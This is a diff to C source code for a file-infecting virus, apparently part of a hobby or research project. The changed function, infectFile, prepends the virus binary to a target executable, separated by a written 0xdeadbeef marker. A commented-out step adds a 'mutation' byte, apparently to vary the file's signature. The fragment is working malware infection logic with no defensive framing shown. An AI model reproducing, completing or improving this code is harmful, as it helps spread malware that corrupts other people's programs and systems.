@@ -141,7 +141,7 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
         remove(tempFileName);
         return -1;
     }
-    if (copyFile(virusFile, tempFile, 0, deadbeefPos) < 0) {
+    if (copyFile(virusFile, tempFile, 0, deadbeefPos - 4) < 0) {
         printf("Could not copy virus to temp file\n");
         fclose(fileToInfect);
         fclose(virusFile);
@@ -149,6 +149,27 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
         remove(tempFileName);
         return -1;
     }
+    // Mutate (add empty byte)
+    /*char mutationByte = 0x00;
+    if (fwrite(&mutationByte, 1, 1, tempFile) != 1) {
+        perror("Could not write mutation byte to infected file");
+        fclose(fileToInfect);
+        fclose(virusFile);
+        fclose(tempFile);
+        remove(tempFileName);
+        return -1;
+    }*/
+    // Write deadbeef pattern
+    char deadbeef[4] = { 0xde, 0xad, 0xbe, 0xef };
+    if (fwrite(&deadbeef, 1, 4, tempFile) != 4) {
+	perror("Could not write deadbeef pattern to infected file");
+	fclose(fileToInfect);
+	fclose(virusFile);
+	fclose(tempFile);
+	remove(tempFileName);
+	return -1;
+    }
+    // Copy file to infect binary
     if (copyFile(fileToInfect, tempFile, 0, EOF) < 0) {
         printf("Could not copy infected file to temp file\n");
         fclose(fileToInfect);
